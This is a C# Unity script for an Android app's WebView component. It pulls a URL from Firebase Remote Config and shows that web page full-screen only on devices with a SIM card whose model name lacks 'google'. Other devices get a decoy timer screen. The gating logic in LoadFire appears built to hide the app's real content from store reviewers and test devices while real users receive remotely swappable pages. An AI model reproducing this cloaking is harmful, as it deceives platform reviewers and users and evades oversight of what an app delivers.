using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using Firebase.RemoteConfig;
using UnityEngine.UI;
using System;
using System.Diagnostics;
using Debug = UnityEngine.Debug;

public class WebView : MonoBehaviour
{
    public FirebaseController FBController;
    [SerializeField] string Url;
    [SerializeField] bool RestoreUrl;
    [SerializeField] Timer timer;

    WebViewObject webViewObject;
    const string pluginName = "com.evgenindev.simdetector.Detector";
    static AndroidJavaClass _pluginClass;
    static AndroidJavaObject _pluginInstance;
    static AndroidJavaClass _unityPlayer;
    static AndroidJavaObject _unityActivity;
    public static AndroidJavaClass PluginClass
    {
        get
        {
            if(_pluginClass == null)
            {
                _pluginClass = new AndroidJavaClass(pluginName);
            }
            return _pluginClass;
        }
    }
    public static AndroidJavaObject PluginInstance
    {
        get
        {
            if( _pluginInstance == null)
            {
                _pluginInstance = PluginClass.CallStatic<AndroidJavaObject>("getInstance");
            }
            return _pluginInstance;
        }
    }
    public static AndroidJavaClass UnityPlayer
    {
        get
        {
            if(_unityPlayer == null)
            {
                _unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
            }
            return _unityPlayer;
        }
    }
    public static AndroidJavaObject UnityActivity
    {
        get
        {
            if(_unityActivity == null)
            {
                _unityActivity = UnityPlayer.GetStatic<AndroidJavaObject>("currentActivity");
            }
            return _unityActivity;
        }
    }

    
    private void Start()
    {
        if (RestoreUrl)
            PlayerPrefs.SetString("key", "");
        Url = PlayerPrefs.GetString("key", "");
        if(Url == "")
        {
            StartCoroutine(FirstStart());
        }
        else
        {
            LoadFire();
        }
    }

    void Update()
    {
        if (Application.platform == RuntimePlatform.Android)
        {
            if (Input.GetKey(KeyCode.Escape))
            {
                webViewObject.GoBack();
            }
        }
    }

    IEnumerator FirstStart()
    {
        Message.Send("Connecting...");
        while (FBController.FbStatus == FirebaseController.FirebaseStatus.Waiting)
        {
            yield return new WaitForSeconds(0.1f);
        }
        if (FBController.FbStatus == FirebaseController.FirebaseStatus.Failed)
        {
            Message.Send("Connection error :(");
        }
        if (FBController.FbStatus == FirebaseController.FirebaseStatus.Connected)
        {
            Message.Send("Connected to " + Url);
            Url = FirebaseRemoteConfig.DefaultInstance.GetValue("url").StringValue;
            if (Url != "")
                PlayerPrefs.SetString("key", Url);
            Message.Send("Connected to " + Url);
        }
        LoadFire();
    }
    
    public void LoadFire()
    {
        if (Application.internetReachability == NetworkReachability.NotReachable)
        {
            Message.Send("No internet connection :(");
            return;
        }
        bool sim;
#if UNITY_EDITOR
        sim = false;
#else
        sim = (PluginInstance.Call<int>("getSimStatus", UnityActivity) == 1);
#endif
        if (Url == "" || SystemInfo.deviceModel.ToLower().Contains("google")
            || !sim)
        {
            Message.SetActive(false);
            timer.gameObject.SetActive(true);
            return;
        }

        StartCoroutine(StartWebPage());
    }

    IEnumerator StartWebPage()
    {
        webViewObject = (new GameObject("WebViewObject")).AddComponent<WebViewObject>();
        webViewObject.Init(
            cb: (msg) =>
            {
                Debug.Log(string.Format("CallFromJS[{0}]", msg));
            },
            err: (msg) =>
            {
                Debug.Log(string.Format("CallOnError[{0}]", msg));
            },
            httpErr: (msg) =>
            {
                Debug.Log(string.Format("CallOnHttpError[{0}]", msg));
            },
            started: (msg) =>
            {
                Debug.Log(string.Format("CallOnStarted[{0}]", msg));
            },
            hooked: (msg) =>
            {
                Debug.Log(string.Format("CallOnHooked[{0}]", msg));
            },
            ld: (msg) =>
            {
                Debug.Log(string.Format("CallOnLoaded[{0}]", msg));
#if UNITY_EDITOR_OSX || (!UNITY_ANDROID && !UNITY_WEBPLAYER && !UNITY_WEBGL)
                // NOTE: depending on the situation, you might prefer
                // the 'iframe' approach.
                // cf. https://github.com/gree/unity-webview/issues/189
#if true
                webViewObject.EvaluateJS(@"
                  if (window && window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.unityControl) {
                    window.Unity = {
                      call: function(msg) {
                        window.webkit.messageHandlers.unityControl.postMessage(msg);
                      }
                    }
                  } else {
                    window.Unity = {
                      call: function(msg) {
                        window.location = 'unity:' + msg;
                      }
                    }
                  }
                ");
#else
                webViewObject.EvaluateJS(@"
                  if (window && window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.unityControl) {
                    window.Unity = {
                      call: function(msg) {
                        window.webkit.messageHandlers.unityControl.postMessage(msg);
                      }
                    }
                  } else {
                    window.Unity = {
                      call: function(msg) {
                        var iframe = document.createElement('IFRAME');
                        iframe.setAttribute('src', 'unity:' + msg);
                        document.documentElement.appendChild(iframe);
                        iframe.parentNode.removeChild(iframe);
                        iframe = null;
                      }
                    }
                  }
                ");
#endif
#elif UNITY_WEBPLAYER || UNITY_WEBGL
                webViewObject.EvaluateJS(
                    "window.Unity = {" +
                    "   call:function(msg) {" +
                    "       parent.unityWebView.sendMessage('WebViewObject', msg)" +
                    "   }" +
                    "};");
#endif
                webViewObject.EvaluateJS(@"Unity.call('ua=' + navigator.userAgent)");
            }
            );
#if UNITY_EDITOR_OSX || UNITY_STANDALONE_OSX
        webViewObject.bitmapRefreshCycle = 1;
#endif
        webViewObject.SetMargins(0, 0, 0, 0);
        webViewObject.SetTextZoom(100);
        webViewObject.SetVisibility(true);

#if !UNITY_WEBPLAYER && !UNITY_WEBGL
        if (Url.StartsWith("http"))
        {
            webViewObject.LoadURL(Url.Replace(" ", "%20"));
        }
        else
        {
            var exts = new string[]{
                ".jpg",
                ".js",
                ".html"  // should be last
            };
            foreach (var ext in exts)
            {
                var url = Url.Replace(".html", ext);
                var src = System.IO.Path.Combine(Application.streamingAssetsPath, url);
                var dst = System.IO.Path.Combine(Application.persistentDataPath, url);
                byte[] result = null;
                if (src.Contains("://"))
                {  // for Android
#if UNITY_2018_4_OR_NEWER
                    // NOTE: a more complete code that utilizes UnityWebRequest can be found in https://github.com/gree/unity-webview/commit/2a07e82f760a8495aa3a77a23453f384869caba7#diff-4379160fa4c2a287f414c07eb10ee36d
                    var unityWebRequest = UnityWebRequest.Get(src);
                    yield return unityWebRequest.SendWebRequest();
                    result = unityWebRequest.downloadHandler.data;
#else
                    var www = new WWW(src);
                    yield return www;
                    result = www.bytes;
#endif
                }
                else
                {
                    result = System.IO.File.ReadAllBytes(src);
                }
                System.IO.File.WriteAllBytes(dst, result);
                if (ext == ".html")
                {
                    webViewObject.LoadURL("file://" + dst.Replace(" ", "%20"));
                    break;
                }
            }
        }
#else
        if (Url.StartsWith("http")) {
            webViewObject.LoadURL(Url.Replace(" ", "%20"));
        } else {
            webViewObject.LoadURL("StreamingAssets/" + Url.Replace(" ", "%20"));
        }
#endif
        yield break;
    }

}